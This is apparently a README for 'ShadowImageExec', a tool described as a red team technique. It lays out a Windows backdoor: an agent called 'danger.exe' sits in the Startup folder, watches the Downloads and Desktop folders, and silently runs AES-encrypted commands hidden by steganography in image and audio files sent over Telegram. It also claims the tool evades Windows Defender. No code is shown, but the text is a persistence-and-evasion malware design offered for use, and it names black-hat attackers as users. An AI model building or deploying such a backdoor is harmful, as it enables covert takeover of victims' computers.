     New Red Team Attack Technique

What is this?

ShadowImageExec is an advanced Red Team attack technique that enables the automatic execution of commands hidden within innocent-looking media files such as .png, .mp3, or .mp4.

The core idea is simple yet powerful: embed an encrypted command inside a media file and allow a passive background agent to automatically detect and execute it as soon as the file is downloaded to the target system â€” without any user interaction.

How the Attack Works
```text
Attacker (White-Hat or Black-Hat)
        â”‚
        â”œâ”€â–¶ embed-stego.py
        â”‚     â†“
        â”‚  Encrypted Payload (exec:...)
        â”‚     â†“
        â””â”€â–¶ Sent via Telegram
              â†“
          Target Device (Windows)
              â†“
     danger.exe (in Startup folder)
              â†“
     Watches Downloads & Desktop
              â†“
   File arrives â†’ Decrypt â†’ Execute
```
---
As soon as the user downloads the file (e.g., from Telegram), the pre-installed danger.exe detects the new file, decrypts the hidden payload, and executes the command silently using Pythonâ€™s subprocess.run() function.

This attack is zero-click, highly stealthy, and has been proven to bypass antivirus software due to the use of encryption and steganography.
---

This tool has been tested against Windows Defender (fully updated) and was not detected under the following conditions:

--danger.exe was added to the Startup folder

--Stego payloads were delivered via Telegram and downloaded to the Desktop

--Payloads were AES-128 encrypted and embedded into .png or .mp3 files

--The agent passively monitored folders and only executed on trigger
